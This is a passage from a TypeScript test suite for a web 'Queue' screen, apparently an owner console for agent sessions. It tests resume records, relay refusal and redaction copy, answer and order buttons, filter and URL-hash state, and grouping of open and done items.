    const resumes = [row(9, "Pick the lock order", 2, "acked"), row(4, "Pick the index", 1, "sent")];
    const text = collectText(render("RecentResumesQ", { region: { ...READY_RESUMES, data: resumes }, onRead: () => undefined }));
    const lines = text.split("Automatic resume ").slice(1);
    assert.equal(lines.length, 2, text);
    assert.match(lines[0] ?? "", /\.claude-work · atrium\/hooks · attempt 2 · spawned · acknowledged\s+— Pick the lock order/);
    assert.match(lines[1] ?? "", /attempt 1 · spawned\s+— Pick the index/);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable", isShown: true },
    { name: "an empty record shows nothing", region: READY_RESUMES, atom: "DetailSurface", isShown: false },
    { name: "a first read in flight shows nothing", region: { status: "loading", data: null, error: null, busy: true }, atom: "DetailSurface", isShown: false },
  ];
  for (const view of views) {
    test(view.name, () => {
      const tree = render("RecentResumesQ", { region: view.region, onRead: () => undefined });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom).length > 0, view.isShown);
    });
  }

  test("opening the drawer re-reads the record", () => {
    let reads = 0;
    const tree = render("RecentResumesQ", { region: { ...READY_RESUMES, data: [row(9, "Pick the lock order", 1, "acked")] }, onRead: () => { reads += 1; } });
    const [button] = buttonLabelled(tree, "Automatic resumes 1");
    (button?.props.onClick as () => void)();
    assert.equal(reads, 1);
  });

  // spec §4.4: the foot button's count and ⚠ follow the page's own tick, as the list does
  test("the page's tick reads the resume record beside the list, the sessions, the count, the thread and both Done reads", async () => {
    const reads: string[] = [];
    const read = (name: string, answer: unknown = undefined) => async () => { reads.push(name); return answer; };
    const isGood = await (screen.getPageReadQ as (deps: unknown) => Promise<boolean>)({
      readList: read("list", { isGood: true, arrived: [], turned: [] }),
      readResumes: read("resumes"),
      sessions: { read: read("sessions") },
      orders: { reread: read("thread") },
      done: { reread: read("done items") },
      relays: { reread: read("done relays") },
      onReadQueueCount: read("count"),
      setStatus: () => undefined,
    });
    assert.deepEqual([isGood, [...reads].sort()], [true, ["count", "done items", "done relays", "list", "resumes", "sessions", "thread"]]);
  });

  test("the record is read from the resume route, whatever the owner list holds", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ resumes: [row(9, "Pick the lock order", 1, "acked")] }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    const setResumes = (next: (prev: unknown) => unknown) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes });
    assert.deepEqual(urls, ["/api/queue/owner/resumes"]);
    assert.deepEqual((getPlain(region) as { data: Array<{ item: { id: number } }> }).data.map((resume) => resume.item.id), [9]);
  });
});

// a limit is the server's → no sentence holds one, as a digit or as a count word
const LIMIT_FIGURE = /\d|\b(?:once|twice|thrice|one|two|three|four|five|six|seven|eight|nine|ten|single|double|triple)\b/i;

describe("relay refusals and redaction", () => {
  const fixture = getRelayThreadFixture();
  const flat = (node: RenderedNode | string) => collectText(node).replace(/\s+/g, " ").trim();

  test("every reason the page knows has a name and a sentence with no limit figure, in digits or in words; an unknown one names its code", () => {
    const codes = ["hop", "pair_cap", "sender_cap", "machine_cap", "token", "secret", "scan_unavailable", "sender_probe", "sender_not_live", "self", "recipient"];
    const lines = codes.map((reason) => call<{ name: string; sentence: string }>("getRelayRefusalLineQ", reason, { sender: "gersona", recipient: "yoaida" }));
    assert.equal(new Set(lines.map((line) => line.name)).size, codes.length);
    assert.deepEqual(lines.filter((line) => LIMIT_FIGURE.test(line.sentence) || line.name === "Refused"), []);
    assert.deepEqual(call("getRelayRefusalLineQ", "recipient_ambiguous", { sender: "gersona", recipient: "yoaida" }), { name: "Refused", sentence: "The queue gave the reason", code: "recipient_ambiguous" });
  });

  test("an earlier page's refusals join the loaded ones; a first page replaces them", () => {
    const prev = { items: [], nextCursor: "c1", refusals: [{ at: "b" }] };
    const page = { items: [], nextCursor: null, refusals: [{ at: "a" }] };
    assert.deepEqual(call<{ refusals: unknown[] }>("getReadThreadQ", prev, page, "c1", false).refusals, [{ at: "a" }, { at: "b" }]);
    assert.deepEqual(call<{ refusals: unknown[] }>("getReadThreadQ", prev, page, null, false).refusals, [{ at: "a" }]);
  });

  test("the redaction posts one owner action per unredacted copy, each by its relay id, with no text", async () => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: realUi },
      fetch: async (url: string, init: { body?: string }) => { posts.push({ url, body: init.body }); return { status: 200, json: async () => ({ ok: true }) }; },
    })) as ScreenModule;
    const [kept, gone] = fixture.items.filter((item) => item.sendId === fixture.items[1]!.sendId);
    const copies = [kept, { ...gone, relay: { ...gone!.relay, redaction: { at: "2026-11-13T05:30:00.000Z", length: 99 } } }];
    await (module.putRelayRedactionQ as (copies: unknown) => Promise<unknown>)(copies);
    assert.deepEqual(posts, [{ url: `/api/queue/owner/items/${kept!.id}/redact`, body: "{}" }]);
  });

  const outcomes = [
    { name: "every copy taken is done", answers: [{ status: 200, data: { ok: true } }, { status: 200, data: { ok: true } }], error: null },
    { name: "a copy already redacted counts as done", answers: [{ status: 409, data: { error: "already_redacted" } }, { status: 200, data: { ok: true } }], error: null },
    { name: "some copies left says how many and asks again", answers: [{ status: 200, data: { ok: true } }, { status: 200, data: { ok: true } }, { status: 503, data: { error: "database_unavailable" } }], error: "1 of 3 copies was not redacted. Redact text again." },
    { name: "every copy refused names the server's reason", answers: [{ status: 409, data: { error: "wrong_kind" } }], error: "Refused: HTTP 409 wrong_kind." },
  ];
  for (const row of outcomes) {
    test(`redaction outcome: ${row.name}`, () => {
      assert.equal(call<{ error: string | null }>("getRedactionOutcomeQ", row.answers).error, row.error);
    });
  }

  // one recipient → `<names>` one word, as spec §12.6 counts it
  test("the redaction dialog's sentence runs at most twelve words", () => {
    const [copy] = fixture.items.filter((item) => item.sendId === fixture.items[1]!.sendId);
    const redaction = { target: { id: copy!.id, item: copy, copies: [copy] }, isBusy: false, error: null, ask: () => undefined, cancel: () => undefined, confirm: () => undefined };
    const texts = findNodes(render("RedactConfirmQ", { redaction }), (node) => node.type === "p" && node.props?.className === "fs-body text-dim").map((node) => collectText(node));
    assert.deepEqual([texts.length, getLongSentences(texts)], [1, []]);
  });

  // a name the peer wrote carries its self-named mark wherever the page paints it
  test("the redaction dialog names a self-named sender with its mark", () => {
    const [copy] = fixture.items.filter((item) => item.sendId === fixture.items[1]!.sendId);
    const redaction = { target: { id: copy!.id, item: copy, copies: [copy] }, isBusy: false, error: null, ask: () => undefined, cancel: () => undefined, confirm: () => undefined };
    const [text] = findNodes(render("RedactConfirmQ", { redaction }), (node) => node.type === "p" && node.props?.className === "fs-body text-dim").map((node) => collectText(node));
    assert.ok(text?.startsWith(`${copy!.relay!.sender.selfDeclaredName} (self-named) sent it to `), text);
  });

  test("the dialog's error slot draws its cross in the crit tone before the words, as every other cross on the relay views", () => {
    const copies = fixture.items.filter((item) => item.sendId === fixture.items[1]!.sendId);
    const slot = (error: string | null) => {
      const redaction = { target: { id: copies[0]!.id, item: copies[0], copies }, isBusy: false, error, ask: () => undefined, cancel: () => undefined, confirm: () => undefined };
      const [alert] = findNodes(render("RedactConfirmQ", { redaction }), (node) => node.props?.role === "alert");
      const glyphs = findNodes(alert!, (node) => node.props?.["aria-hidden"] === "true").map((node) => [node.props.className, collectText(node)]);
      return { glyphs, text: flat(alert!) };
    };

    assert.deepEqual([slot("1 of 2 copies was not redacted. Redact text again."), slot(null)], [
      { glyphs: [["text-crit", "✕ "]], text: "✕ 1 of 2 copies was not redacted. Redact text again." },
      { glyphs: [], text: "" },
    ]);
  });

  // layout §2 → Foot: the open list leaves a redacted copy out and the relay read brings it back → the two land together or the row drops for a render
  test("a redaction's re-read lands the list and both Done reads at once: a relay on its way keeps its row and its sheet while the relay read is late", async () => {
    const redacted = fixture.items.find((item) => item.id === 415)!;
    const kept = { ...redacted, relay: { ...redacted.relay!, redaction: null } };
    let isRedacted = false;
    let releaseRelays: () => void = () => undefined;
    const relaysLate = new Promise<void>((resolve) => { releaseRelays = resolve; });
    const answer = (body: unknown) => ({ status: 200, json: async () => body });
    const stateful = createStatefulReact();
    const module = (await loadScreenModule(QUEUE_SRC, {
      React: stateful.react, URLSearchParams, window: { UI: uiStub(), location: { hash: "#queue" }, history: { replaceState: () => undefined } },
      fetch: async (url: string) => {
        const isAfter = isRedacted;
        if (url.includes("kind=relay")) {
          if (isAfter) await relaysLate;
          return answer({ items: [isAfter ? redacted : kept], nextCursor: null, refusals: [] });
        }
        if (url.includes("kind=item")) return answer({ items: [], nextCursor: null, refusals: [] });
        return answer({ items: isAfter ? [] : [kept], nextCursor: null });
      },
    })) as ScreenModule;
    type Reread = (options?: unknown) => Promise<unknown>;
    type Thread = { thread: unknown; read: Reread; reread: Reread };
    const run = () => {
      stateful.resetCursor();
      const [list, setList] = (stateful.react.useState as (initial: unknown) => [{ data: { items: unknown[] } | null }, unknown])({ status: "loading", data: null, error: null, readAt: null, newIds: [] });
      const readList = (module.useListReadQ as (list: unknown, setList: unknown) => Reread)(list, setList);
      const useThread = module.useThreadQ as (scope: unknown) => Thread;
      return { list, readList, done: useThread({ selectedIds: [], kind: "item" }), relays: useThread({ selectedIds: [], kind: "relay" }) };
    };
    const held = { item: kept, copies: [kept] };
    const getShown = () => {
      const { list, done, relays } = run();
      const groups = call<Array<{ rows: Array<{ id: number; copies: Array<{ relay: { redaction: unknown } }> }> }>>("getListGroupsQ", getPlain(list.data?.items ?? []), getPlain({ done: done.thread, relays: relays.thread }), { profile: "" }, []);
      const row = groups.flatMap((group) => group.rows).find((one) => one.id === 415);
      return [call<{ kind: string }>("getSheetStateQ", groups, "415", held).kind, row?.copies.some((copy) => copy.relay.redaction !== null) ?? null];
    };
    const seeded = run();
    await Promise.all([seeded.readList({ isFresh: true }), seeded.done.read(), seeded.relays.read()]);
    const before = getShown();
    isRedacted = true;
    const reads = run();
    const reread = (module.getListsRereadQ as (readList: Reread, rereadDone: Reread, rereadRelays: Reread) => Promise<unknown>)(reads.readList, reads.done.reread, reads.relays.reread);
    await new Promise((resolve) => setImmediate(resolve));
    const whileLate = getShown();
    releaseRelays();
    await reread;
    assert.deepEqual([before, whileLate, getShown()], [["item", false], ["item", false], ["item", true]]);
  });
});

describe("screen", () => {
  test("the Queue screen renders its header and a loading body before the first read", () => {
    const tree = render("ScreenQueue", {});
    const atoms = findNodes(tree, (node) => node.type === "ui-atom").map((node) => node.props.atom);
    assert.ok(atoms.includes("PageHeader"), String(atoms));
    assert.ok(atoms.includes("LoadingPlaceholder"), String(atoms));
  });

  // the list carries no delivery flag → a page alert here would read as a delivery outage that does not exist
  test("a loaded list renders the list alone at rest, one row per item under bands, and no sheet", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report", linkedDocIds: [43944] })];
    const queue = withList(buildQueue().queue, items);
    const pane = render("MiddlePaneQ", { queue });
    const [slot] = byClass(pane, "queue-list-slot");
    assert.deepEqual(findNodes(pane, (node) => node.props?.role === "option").map((node) => node.props.id), ["queue-row-1", "queue-row-2"]);
    assert.deepEqual(findNodes(pane, (node) => node.props?.className === "queue-band").map((node) => collectText(node)), ["Decisions 1", "Reports 1"]);
    assert.equal(findNodes(pane, (node) => node.props?.atom === "AlertCard").length, 0);
    assert.deepEqual([slot?.props.hidden, byClass(pane, "queue-sheet").length], [undefined, 0]);
  });

  test("an opened row puts the list away, still mounted, and its sheet takes the pane", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report", linkedDocIds: [43944] })];
    const listed = withList(buildQueue().queue, items);
    const pane = render("MiddlePaneQ", { queue: { ...listed, sheet: getSheet(listed.groups, "2"), selectedId: 2 } });
    const [slot] = byClass(pane, "queue-list-slot");
    const [link] = findNodes(pane, (node) => node.type === "a" && node.props.className === "prose-link");
    assert.deepEqual([slot?.props.hidden, findNodes(slot as RenderedNode, (node) => node.props?.role === "option").length], [true, 2]);
    assert.equal(link?.props.href, "#clauded-docs?doc=43944");
  });
});

describe("an owner action's answer", () => {
  const draft = { 41: { code: "R2", text: "keep the shadow DB" } };
  const run = async (status: number, body: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => body };
      },
    })) as ScreenModule;
    let drafts: Record<string, unknown> = { ...draft };
    let busy: unknown = null;
    const counts = { reload: 0 };
    const isDone = await (module.sendActionQ as (deps: unknown) => Promise<boolean>)({
      id: 41,
      action: "answer",
      body: { code: "R2", text: "keep the shadow DB" },
      setBusy: (next: unknown) => { busy = next; },
      setDrafts: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { drafts = next(drafts); },
      reload: () => { counts.reload += 1; },
    });
    return { isDone, drafts: getPlain(drafts), busy: getPlain(busy), posts: getPlain(posts), reloads: counts.reload };
  };

  test("a taken answer posts the card's body, clears its draft and re-reads the list", async () => {
    const result = await run(200, { ok: true });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/items/41/answer", body: { code: "R2", text: "keep the shadow DB" } }]);
    assert.equal(result.isDone, true);
    assert.equal(result.drafts[41], undefined);
    assert.equal(result.reloads, 1);
  });

  const refusals = [
    {
      name: "a page-origin refusal keeps the draft and shows on the card",
      status: 403,
      body: { error: "forbidden" },
      error: { id: 41, message: "The monitor refused this action. Try again." },
    },
    {
      name: "a refusal keeps the draft and shows the reason on the card",
      status: 400,
      body: { error: "unknown_option", reason: "the code is not one of this item's options" },
      error: { id: 41, message: "Refused: the code is not one of this item's options." },
    },
  ];
  // spec §4.4: a refused act is followed by a read at once, so the refusal line is true when it is read
  for (const row of refusals) {
    test(`${row.name}, and re-reads the page at once`, async () => {
      const result = await run(row.status, row.body);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.drafts, draft);
      assert.deepEqual(result.busy, { id: null, error: row.error });
      assert.equal(result.reloads, 1);
    });
  }
});

describe("sheet composer buttons", () => {
  const foot = (item: unknown, draft: unknown) => {
    const { calls, queue } = buildQueue();
    return { calls, tree: render("SheetFootQ", { item, draft, queue, isBusy: false, error: null }) };
  };
  const press = (tree: RenderedNode, label: string) => {
    const [button] = buttonLabelled(tree, label);
    assert.ok(button, `${label} rendered`);
    assert.equal(button.props.disabled, undefined, `${label} is always enabled`);
    (button.props.onClick as () => void)();
  };

  const sendRows = [
    { name: "no option and no text writes the note-slot line", draft: {}, isInk: false, calls: [["setDraft", 41, { error: "Pick an option or write an answer, then send." }]] },
    { name: "whitespace-only text writes the note-slot line", draft: { text: "   " }, isInk: false, calls: [["setDraft", 41, { error: "Pick an option or write an answer, then send." }]] },
    { name: "a picked option alone sends its code", draft: { code: "R1" }, isInk: true, calls: [["answerItem", 41, { code: "R1" }]] },
    { name: "text alone sends the text", draft: { text: "hold until Friday" }, isInk: true, calls: [["answerItem", 41, { text: "hold until Friday" }]] },
    { name: "an option and text send both", draft: { code: "R2", text: "after the deploy" }, isInk: true, calls: [["answerItem", 41, { code: "R2", text: "after the deploy" }]] },
  ];
  for (const row of sendRows) {
    test(`Send answer: ${row.name}`, () => {
      const { calls, tree } = foot(buildItem(), row.draft);
      press(tree, "Send answer");
      assert.deepEqual(getPlain(calls), row.calls);
    });

    // spec §9.8 → On an answer, at rest: enabled always, the ink fill only once there is an answer to send; the send key presses it either way
    test(`Send answer is ink only with an answer to send, and send-keyed: ${row.name}`, () => {
      const [button] = buttonLabelled(foot(buildItem(), row.draft).tree, "Send answer");
      assert.deepEqual([String(button?.props.className).split(" ").includes("primary"), button?.props["data-key"]], [row.isInk, "send"]);
    });
  }

  const reportRows = [
    { name: "Mark as read on an empty box sends the seen action", draft: {}, label: "Mark as read", calls: [["settle", 41, "seen"]] },
    { name: "Mark as read with text in the box says the order is unsent", draft: { text: "thanks" }, label: "Mark as read", calls: [["setDraft", 41, { error: "Unsent order in the field. Send it, or clear it first." }]] },
    { name: "Send order sends the reply action with the typed text", draft: { text: "thanks, merged" }, label: "Send order", calls: [["settle", 41, "reply", { text: "thanks, merged" }]] },
    { name: "Send order on a blank box asks for the order", draft: { text: "  " }, label: "Send order", calls: [["setDraft", 41, { error: "Write the order, then send." }]] },
  ];
  for (const row of reportRows) {
    test(row.name, () => {
      const { calls, tree } = foot(buildItem({ kind: "report" }), row.draft);
      press(tree, row.label);
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  // which button carries the ink follows the box; order and labels never change
  const inkRows = [
    { name: "an empty box", draft: {}, ink: "Mark as read" },
    { name: "a box with text", draft: { text: "rebase" }, ink: "Send order" },
  ];
  for (const row of inkRows) {
    test(`the report's ink button with ${row.name} is ${row.ink}, the order staying Mark as read then Send order`, () => {
      const buttons = findNodes(foot(buildItem({ kind: "report" }), row.draft).tree, (node) => node.type === "button" && /\bbtn lg\b/.test(String(node.props.className)));
      assert.deepEqual(buttons.map((node) => collectText(node)), ["Mark as read", "Send order"]);
      assert.deepEqual(buttons.filter((node) => /\bprimary\b/.test(String(node.props.className))).map((node) => collectText(node)), [row.ink]);
    });
  }
});

// spacing reads the role-key ladder (index.html tailwind config) → a number or a px value in a queue node is drift
const NUMERIC_SPACING_CLASS = /(^|\s)-?(p|m|gap|space)(x|y|t|r|b|l|s|e)?-(\d|\[)/;

describe("the queue page spaces on role keys only", () => {
  const data = {
    items: [
      buildItem({
        id: 1,
        status: "answered",
        isApprovalClass: true,
        session: buildSession({ state: "live" }),
        resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: null }],
      }),
      buildItem({ id: 2, kind: "report", linkedDocIds: [43944], status: "unacked", deviation: "unacked", session: buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId: null } }) }),
    ],
    nextCursor: 9,
  };
  const states = [
    { name: "a loaded list with its bands, a deviation and Show more", node: () => render("QueueListQ", { queue: withList(buildQueue().queue, data.items, data.nextCursor) }) },
    { name: "a sheet with a refusal", node: () => renderSheet({ item: data.items[0], queue: buildQueue({ busy: { id: null, error: { id: 1, message: "Refused: x." } } }).queue }) },
    {
      name: "the order view with a ticked row, the composer and a refusal",
      node: () => renderOrders({ composer: { text: "rebase on main", isBusy: false, error: "Refused: x." } }, { selectedIds: [SESSION_ID], isEndedShown: true }),
    },
  ];
  for (const row of states) {
    test(row.name, () => {
      const classes = findNodes(row.node(), () => true).map((node) => String(node.props?.className ?? ""));
      assert.deepEqual(classes.filter((value) => NUMERIC_SPACING_CLASS.test(value)), []);
    });
  }
});

describe("report reply", () => {
  const rows = [
    { name: "a report that takes an order shows the order field in the sheet's foot", isFreeTextAllowed: true, fields: 1 },
    { name: "a report that takes no order shows no order field", isFreeTextAllowed: false, fields: 0 },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const tree = render("SheetFootQ", { item: buildItem({ kind: "report", isFreeTextAllowed: row.isFreeTextAllowed }), draft: {}, queue: buildQueue().queue, isBusy: false, error: null });
      assert.equal(findNodes(tree, (node) => node.type === "textarea").length, row.fields);
    });
  }
});

describe("action refusal copy", () => {
  const rows = [
    { name: "the server's worded reason is shown", answer: { status: 400, data: { error: "free_text_not_allowed", reason: "this report takes no reply" } }, expected: "Refused: this report takes no reply." },
    { name: "a refusal with no reason shows fixed copy", answer: { status: 400, data: { error: "invalid_input", issues: [] } }, expected: "The monitor refused this action. Try again." },
    { name: "a refusal with no body shows fixed copy", answer: { status: 400, data: null }, expected: "The monitor refused this action. Try again." },
    { name: "a state change says the list shows where the item is now", answer: { status: 409, data: { error: "conflict", reason: "item is answered" } }, expected: "Refused: the item changed state. The list shows where it is now." },
  ];
  // spec §10: the page has no Refresh, so no refusal line names one
  for (const row of rows) {
    test(row.name, () => {
      const line = call<string>("getActionErrorQ", row.answer);
      assert.equal(line, row.expected);
      assert.doesNotMatch(line, /refresh/i);
    });
  }
});

describe("refusal lines", () => {
  const message = "Refused: the item changed state. The list shows where it is now.";
  const rows = [
    { name: "a refused sheet action", node: () => renderSheet({ item: buildItem({ id: 1 }), queue: buildQueue({ busy: { id: null, error: { id: 1, message } } }).queue }) },
    {
      name: "a refused send",
      node: () => renderOrders({ composer: { text: "rebase on main", isBusy: false, error: message } }, { selectedIds: [SESSION_ID] }),
    },
  ];
  for (const row of rows) {
    test(`${row.name} is an alert led by the crit glyph, toned whole`, () => {
      const alerts = findNodes(row.node(), (node) => node.props?.role === "alert" && /\btext-crit\b/.test(String(node.props?.className ?? "")));
      assert.equal(alerts.length, 1, row.name);
      const text = collectText(alerts[0] as RenderedNode);
      assert.deepEqual([text.startsWith((realUi.TONE_GLYPH as Record<string, string>).crit), text.endsWith(message)], [true, true], text);
    });
  }
});

describe("queue filter bar", () => {
  const items = [
    buildItem({ id: 1, session: buildSession({ profileLabel: "work-dev" }) }),
    buildItem({ id: 2, session: buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal", cwdTail: "wt/owner-queue" }) }),
  ];
  const renderBar = (filter: Record<string, string>) => {
    const picks: unknown[] = [];
    const tree = render("QueueFilterBarQ", { items, filter, onFilter: (next: unknown) => picks.push(next) });
    const [bar] = findNodes(tree, (node) => node.props.atom === "FilterBar");
    const triggers = Object.fromEntries(findNodes(tree, (node) => node.props.atom === "FilterTrigger").map((node) => [node.props.axis, node.props]));
    return { bar, triggers, picks };
  };

  // the rail's ticks are the session scope and done items follow the open ones → the bar holds the Account trigger alone (spec §4.1 → Bar, §4.6)
  const rows = [
    { name: "at defaults Account reads All and the reset stays hidden", filter: { profile: "" }, account: "All", isApplied: false },
    { name: "a chosen account names that account and shows the reset", filter: { profile: "personal" }, account: "personal", isApplied: true },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const { bar, triggers } = renderBar(row.filter);
      assert.deepEqual(Object.keys(triggers), ["Account"]);
      assert.equal(triggers.Account?.value, row.account);
      assert.equal(bar?.props.isApplied, row.isApplied);
    });
  }

  // one account and no account filter → nothing to choose: no bar, the first band follows the head
  const cardRows = [
    { name: "open items of two accounts draw the bar", open: items, done: [], filter: { profile: "" }, hasBar: true },
    { name: "an open and a done item of two accounts draw the bar", open: [items[0]], done: [{ ...items[1], id: 3, status: "seen", closedAt: "2026-11-10T07:00:00.000Z" }], filter: { profile: "" }, hasBar: true },
    { name: "one account and no account filter draw no bar", open: [items[0]], done: [], filter: { profile: "" }, hasBar: false },
    { name: "an applied account filter draws the bar whatever is loaded", open: [items[0]], done: [], filter: { profile: "personal" }, hasBar: true },
  ];
  for (const row of cardRows) {
    test(`the list card: ${row.name}`, () => {
      const { queue } = buildQueue();
      const loaded = { ...withList(queue, row.open), filter: row.filter, done: { ...queue.done, thread: { ...queue.done.thread, items: row.done } } };
      const [card] = findNodes(render("QueueListQ", { queue: loaded }), (node) => node.props?.atom === "Card");
      assert.equal(Boolean(card?.props.bar), row.hasBar);
    });
  }

  test("Reset filters returns the account to All", () => {
    const { bar, picks } = renderBar({ profile: "personal" });
    (bar?.props.onReset as () => void)();
    assert.deepEqual(getPlain(picks), [{ profile: "" }]);
  });

  test("a chosen value no loaded item carries stays an option, so its trigger still names it", () => {
    const { triggers } = renderBar({ profile: "archived" });
    assert.equal(triggers.Account?.value, "archived");
    assert.ok((triggers.Account?.options as Array<{ key: string }>).some((option) => option.key === "archived"));
  });
});

describe("filter state in the hash", () => {
  const load = async (hash: string) => {
    const location = { hash };
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: uiStub(), location, history: { replaceState: (_state: unknown, _title: string, url: string) => { location.hash = url; } } },
    })) as ScreenModule;
    return { module, location };
  };
  const rows = [
    { name: "the account round-trips through the screen query", start: "#queue", filter: { profile: "work-dev" }, hash: "#queue?profile=work-dev" },
    { name: "defaults leave a bare screen hash and read back as defaults", start: "#queue?profile=personal", filter: { profile: "" }, hash: "#queue" },
  ];
  for (const row of rows) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      (module.setFilterHashQ as (filter: unknown) => void)(row.filter);
      assert.ok(row.hash === undefined ? location.hash.startsWith("#queue") : location.hash === row.hash, location.hash);
      assert.deepEqual(getPlain((module.getFilterFromHashQ as () => unknown)()), row.filter);
    });
  }

  // one hash writer merges every key → a filter write never erases the selected item or the ticks (spec §4.3 → Selection)
  const mergeRows = [
    { name: "a filter write keeps the selected item and the ticks", start: "#queue?item=41&to=a,b", patch: { profile: "work-dev" }, expected: { profile: "work-dev", item: "41", to: "a,b" } },
    { name: "an item write keeps the filter and the ticks", start: "#queue?profile=personal&to=s1", patch: { item: "7" }, expected: { profile: "personal", item: "7", to: "s1" } },
    { name: "an emptied key leaves the hash and the others stay", start: "#queue?item=7&profile=personal", patch: { item: "" }, expected: { profile: "personal", item: "", to: "" } },
  ];
  for (const row of mergeRows) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      (module.setHashStateQ as (patch: unknown) => void)(row.patch);
      assert.ok(location.hash.startsWith("#queue"), location.hash);
      assert.deepEqual(getPlain((module.getHashStateQ as () => unknown)()), row.expected);
    });
  }

  // Orders is always open and the ticks are the one selection (spec §9.1, §9.2)
  // → an old link's view= or session= names no state, and the first write leaves it out
  const oldLinks = [
    { name: "an old link's view= opens nothing and leaves the hash at the first write", start: "#queue?view=orders&item=41" },
    { name: "an old link's session= scopes nothing and leaves the hash at the first write", start: "#queue?session=s1&item=41" },
  ];
  for (const row of oldLinks) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      assert.deepEqual(getPlain((module.getFilterFromHashQ as () => unknown)()), { profile: "" });
      (module.setHashStateQ as (patch: unknown) => void)({ item: "" });
      assert.equal(location.hash, "#queue");
    });
  }
});

describe("list groups", () => {
  const gersona = buildSession({ id: "a1", name: "gersona" });
  const yoaida = buildSession({ id: "b2", name: "yoaida" });
  const order = (id: number, session: unknown, sendId: string | null, answeredAt = "2026-11-12T12:20:00.000Z") =>
    buildItem({ id, kind: "message", status: "delivered", body: "rebase", answeredAt, sendId, session });
  const getShape = (items: unknown[]) =>
    call<Array<{ key: string; label: string; rows: Array<{ id: number; copies: Array<{ id: number }> }> }>>("getGroupsQ", items)
      .map((group) => ({ key: group.key, rows: group.rows.map((row) => [row.id, row.copies.map((copy) => copy.id)]) }));

  // layout §6 → Order: In delivery reads newest post first like the Done bands; the open bands keep the server's queue order
  test("open decisions, then open reports, each in server order, then In delivery newest post first, and an empty group is left out", () => {
    const at = (minutesAgo: number) => new Date(Date.parse("2026-11-13T06:00:00.000Z") - minutesAgo * 60_000).toISOString();
    const items = [
      buildItem({ id: 1, kind: "report" }),
      buildItem({ id: 2, status: "answered", askedAt: at(42) }),
      buildItem({ id: 3, askedAt: at(9) }),
      buildItem({ id: 4, kind: "report", status: "answered", askedAt: at(3) }),
      buildItem({ id: 5, askedAt: at(2) }),
      buildItem({ id: 6, kind: "relay", status: "answered", askedAt: at(120), sendId: "s-6" }),
      buildItem({ id: 7, kind: "message", status: "delivered", askedAt: at(2), sendId: "s-7" }),
    ];
    assert.deepEqual(getShape(items), [
      { key: "decisions", rows: [[3, [3]], [5, [5]]] },
      { key: "reports", rows: [[1, [1]]] },
      { key: "inDelivery", rows: [[7, [7]], [4, [4]], [2, [2]], [6, [6]]] },
    ]);
    assert.deepEqual(getShape([buildItem({ id: 9, kind: "report" })]).map((group) => group.key), ["reports"]);
  });

  const foldRows = [
    { name: "the copies of one send fold into one row under its lowest id", items: [order(12, yoaida, "s-1"), order(11, gersona, "s-1"), order(13, gersona, "s-2")], expected: [[11, [11, 12]], [13, [13]]] },
    { name: "copies with no send id fold by equal time and text", items: [order(21, gersona, null), order(22, yoaida, null), order(23, yoaida, null, "2026-11-12T12:21:00.000Z")], expected: [[21, [21, 22]], [23, [23]]] },
  ];
  for (const row of foldRows) test(row.name, () => assert.deepEqual(getShape(row.items)[0]?.rows, row.expected));
});

// spec §4.6 (One list): the history read's decisions and reports no longer open, under Done bands below the open ones, on the list's own rows and sheet
describe("done items in the one list", () => {
  const atrium = buildSession({ id: "c3", name: "atrium" });
  const record = (route: string) => ({ route, signal: "fetch_metadata" });
  const answered = { answeredAt: "2026-11-19T05:30:00.000Z", closedAt: "2026-11-19T05:30:00.000Z" };
  const doneReport = (overrides: Record<string, unknown> = {}) =>
    buildItem({ id: 806, kind: "report", title: "Deploy 65 finished", options: [], status: "seen", closedAt: "2026-11-19T05:30:00.000Z", session: atrium, ...overrides });
  const doneDecision = (overrides: Record<string, unknown> = {}) =>
    buildItem({ id: 812, status: "delivered", answer: { code: "R1", text: null }, answerRecord: record("answer"), ...answered, ...overrides });

  // KST days: 2026-11-18T15:30Z is Nov 19 00:30 → Today beside Nov 19 14:30; Nov 18 → Yesterday; older → its month and day
  test("each row stands in the band of its end's day, in the read's order, one item a row", () => {
    const items = [
      doneReport({ id: 5, closedAt: "2026-11-19T05:30:00.000Z" }),
      doneReport({ id: 4, closedAt: "2026-11-18T15:30:00.000Z" }),
      doneReport({ id: 3, closedAt: "2026-11-18T03:00:00.000Z" }),
      doneReport({ id: 2, closedAt: "2026-11-16T10:00:00.000Z" }),
      doneReport({ id: 1, closedAt: "2026-11-16T09:00:00.000Z" }),
    ];
    const rows = items.map((item) => call("getSingleRowQ", item));
    const groups = call<Array<{ label: string; rows: Array<{ id: number; copies: unknown[]; isDone: boolean }> }>>("getDoneGroupsQ", rows, new Date("2026-11-19T06:00:00.000Z"));
    assert.deepEqual(groups.map((group) => [group.label, group.rows.map((row) => [row.id, row.copies.length, row.isDone])]), [
